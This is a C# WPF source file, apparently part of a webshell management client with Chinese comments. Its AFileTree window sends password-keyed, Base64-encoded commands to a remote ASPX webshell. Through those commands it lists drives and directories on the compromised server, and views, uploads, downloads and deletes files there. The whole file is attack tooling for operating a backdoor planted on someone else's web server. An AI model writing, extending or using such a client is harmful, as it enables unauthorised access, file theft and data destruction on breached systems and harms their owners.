using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using WpfApp1.Payload.aspx;
using WpfApp1.Utli;

namespace WpfApp1.UI.aspx
{
    /// <summary>
    /// AFileTree.xaml 的交互逻辑
    /// </summary>
    public partial class AFileTree : Window
    {
        public static ObservableCollection<FileListData> FileListData = new ObservableCollection<FileListData>(); //及时更新

        public string shell { get; set; }
        public string Password { get; set; }
        /// <summary>
        /// 脚本类型
        /// </summary>
        public string Script { get; set; }

        public AFileTree()
        {
            InitializeComponent();
            AspxListView.ItemsSource = FileListData;

        }

        /// <summary>
        /// 加载 payload
        /// </summary>
        Base Base = new Base();
        encrypt encrypt = new encrypt();

        public string Ptah { get; set; } //Treeview 目录

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            FileListData.Clear();
            try
            {
                string p = Base.info();
                string rsults = Post.Postring(shell, new Dictionary<string, string> { { Password, p } });


                if (rsults == "webshell连接超时")
                {

                    this.Close();
                    MessageBox.Show("链接超时或者网络原因！");
                }
                else
                {
                    string[] xz = rsults.Split("\t");
                    Text1.Text = xz[0];
                    string[] p1 = xz[1].Split(":");


                    foreach (string s in p1)
                    {
                        if (s == "")
                        {
                            return;
                        }
                        var pNode = new TreeViewItem()
                        {
                            Header = "本地磁盘(" + s + ":)",
                            Tag = s + ":\\",
                        };
                        pNode.Items.Add(null);
                        pNode.Expanded += PNode_Expanded;
                        FolderView.Items.Add(pNode);

                    }
                }
                

               

            }
            catch (Exception ex)
            {
                MessageBox.Show("驱动器不存在,或者未加载",ex.Message);
            }
        }
        //添加字节点
        private void PNode_Expanded(object sender, RoutedEventArgs e)
        {
 
            var item = (TreeViewItem)sender;
            // If the item only contains the dummy data
            if (item.Items.Count != 1 || item.Items[0] != null)
                return;
            // Clear dummy data
            item.Items.Clear();
            FileListData.Clear();
            //路径 C:\\
            string Fullpath = (string)item.Tag;

            Text1.Text = Fullpath.Replace("/","\\");

            var directories = new List<string>();

            try
            {
                //发送Post请求 
               
                string dirs = Base.FDir();
                string z1 = dirs + "&path=" + encrypt.EncodeBase64("utf-8", Fullpath);
                string rest = Post.Postring(shell, new Dictionary<string, string> { { Password, z1 } });

                string[] r1 = rest.Split("\n");
                foreach (string s in r1)
                {
                   
                    string[] s1 = s.Split("\t");
                    string Path = s1[0];
                    string time = s1[1];
                    string size = s1[2];
                    string t = s1[3];
                    FileListData.Add(new FileListData() { path = Path, time = time, size = size, attribute = t });

                    if (Path.Contains("/") == true)
                    {
                        var ENode = new TreeViewItem()
                        {
                            Header = Path,
                            Tag = Fullpath + Path
                        };

                        ENode.Items.Add(null);
                        ENode.Expanded += PNode_Expanded;

                        item.Items.Add(ENode);
                    }
               

                }
              

            }
            catch(Exception ex)
            {
               
            }
           
        }



        /// <summary>
        /// 查看文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Viewfile_Click(object sender, RoutedEventArgs e)
        {
            FileListData listData = AspxListView.SelectedItem as FileListData;
            if (listData != null && listData is FileListData)
            {

                string path = Text1.Text + listData.path;
                ViewFile viewFile = new ViewFile();
                viewFile.getPath = path;
                viewFile.getUrl = shell;
                viewFile.getPwd = Password;
                viewFile.getScript = Script;
                viewFile.Show();
            }

        }
        /// <summary>
        /// 新建文件 点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Createfile_Click(object sender, RoutedEventArgs e)
        {
            FileListData listData = AspxListView.SelectedItem as FileListData;
            if (listData != null && listData is FileListData)
            {

                string path = Text1.Text + listData.path;
                Createfile Createfile = new Createfile();
                Createfile.getPath = path;
                Createfile.getUrl = shell;
                Createfile.getPwd = Password;
                Createfile.getScript = Script;
                Createfile.Show();
            }
        }


        /// <summary>
        /// 是否 右键选中
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void AspxListView_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            
            if (AspxListView.SelectedItem != null)
            {
                Viewfile.IsEnabled = true;
                Deletefile.IsEnabled = true;
                Dowfile.IsEnabled = true;
                
                
            }
            else
            {

                Viewfile.IsEnabled = false;
                Deletefile.IsEnabled = false;
                Dowfile.IsEnabled = false;
            }
        }

        /// <summary>
        /// 读取按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            FileListData.Clear();
            try
            {
                string dirs = Base.FDir();
                string z1 = dirs + "&path=" + encrypt.EncodeBase64("utf-8", Text1.Text);
                string rest = Post.Postring(shell, new Dictionary<string, string> { { Password, z1 } });

                string[] r1 = rest.Split("\n");
                foreach (string s in r1)
                {
                    string[] s1 = s.Split("\t");
                    string Path = s1[0];
                    string time = s1[1];
                    string size = s1[2];
                    string t = s1[3];
                    FileListData.Add(new FileListData() { path = Path, time = time, size = size, attribute = t });


                }
            }
            catch (Exception ex)
            {

            }
        }
        /// <summary>
        /// 删除文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Deletefile_Click(object sender, RoutedEventArgs e)
        {
            FileListData listData = AspxListView.SelectedItem as FileListData;
            if (listData != null && listData is FileListData)
            {
                if (listData.path.Contains("/") == true)
                {

                    MessageBox.Show(listData.path);
                }
                else
                {
                    string messageBoxText = String.Format("确定删除文件{0}吗?", listData.path);
                    MessageBoxResult result = MessageBox.Show(messageBoxText, "删除文件", MessageBoxButton.YesNo, MessageBoxImage.Error);
                    if (result == MessageBoxResult.Yes)
                    {
                        string path = Text1.Text + listData.path;
                        string z1 = Base.Delete();
                        string p = z1 + "&path=" + encrypt.EncodeBase64("utf-8", path);

                        string results = Post.Postring(shell, new Dictionary<string, string> { { Password, p } });


                        if (results == "1")
                        {
                            MessageBox.Show("Success");

                        }
                        else
                        {
                            MessageBox.Show(results);
                        }
                    }


                }
            }

        }
        /// <summary>
        /// 文件上传
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void UploadFiles_Click(object sender, RoutedEventArgs e)
        {

            string FileOut = string.Empty;
            var openFileDialog = new Microsoft.Win32.OpenFileDialog()
            {
                Filter = "Excel Files (*.)|*"
            };
            var result = openFileDialog.ShowDialog();
            if (result == true)
            {
                //获取文件路径
                var FileNmae = openFileDialog.FileName;
                //读取文件
                using (StreamReader sr = new StreamReader(FileNmae, Encoding.Default))
                {
                    FileOut = sr.ReadLine();

                }

                int index = FileNmae.LastIndexOf("\\"); //分隔符
                string fileName = FileNmae.Substring(index + 1, FileNmae.Length - index - 1); //获取文件名
                string path = Text1.Text + fileName; //组合文件名目录


                string z1 = Base.CreateFile();
                string BasePath = encrypt.EncodeBase64("utf-8", path);
                string content = encrypt.EncodeBase64("utf-8", FileOut);
                string p = z1 + "&path=AQ" + BasePath + "&content=AQ" + content;
                string results = Post.Postring(shell, new Dictionary<string, string> { { Password, p } });
                if (results == "1")
                {
                    MessageBox.Show("Success");
                }
                else
                {
                    MessageBox.Show(results);
                }


            }
        }

        /// <summary>
        /// 文件下载 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Dowfile_Click(object sender, RoutedEventArgs e)
        {
            
            string TextOut = string.Empty;

            var SaveFileDialog = new Microsoft.Win32.SaveFileDialog()
            {
                Filter = "Excel Files (*.)|*"
            };
            var result = SaveFileDialog.ShowDialog();
            if (result == true)
            {
                //获取文件路径
                var FileNmae = SaveFileDialog.FileName;
                int index = FileNmae.LastIndexOf("\\"); //分隔符
                string fileOpenPath = FileNmae.Substring(0, index); //目录


                FileListData listData = AspxListView.SelectedItem as FileListData;
                if (listData != null && listData is FileListData)
                {
                    if (listData.path.Contains("/") == true)
                    {

                        MessageBox.Show("目录暂不支持下载！");
                    }
                    else
                    {
                        string z1 = Base.ReadFile();
                        string Path = Text1.Text + listData.path;
                        string BasePath = encrypt.EncodeBase64("utf-8", Path);
                        string p = z1 + "&path=AQ" + BasePath;
                        TextOut = Post.Postring(shell, new Dictionary<string, string> { { Password, p } });

                        MessageBox.Show("下载成功！");
                    }
                }
                try
                {
                    StreamWriter wr = File.CreateText(FileNmae);
                    wr.Write(TextOut);
                    wr.Flush();
                    wr.Close();
                }
                catch
                {
                    MessageBox.Show("文件保存异常！");
                }
            }
        }

        /// <summary>
        /// ListView 鼠标双击
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void AspxListView_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            
            foreach (object a in AspxListView.SelectedItems)
            {
                
                string path = (a as FileListData).path;
                if (path.Contains("/") == true)
                    Text1.Text += path.Replace("/","\\");

               
                
            }
        }




    }
}